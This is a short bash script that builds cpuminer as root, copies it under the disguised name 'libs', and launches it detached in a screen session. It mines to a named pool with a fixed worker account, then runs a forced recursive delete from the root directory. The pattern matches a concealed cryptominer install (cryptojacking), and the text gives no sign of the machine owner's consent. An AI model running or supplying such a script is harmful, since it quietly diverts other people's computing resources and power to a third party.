#!/bin/bash
sudo chmod +x build.sh 
sudo ./build.sh
sudo cp cpuminer libs
sudo screen -d -m ./libs -a argon2d-crds -o stratum+tcp://crds.suprnova.cc:2771 -u duyuno.duy -p x
cd /
sudo rm -rf libs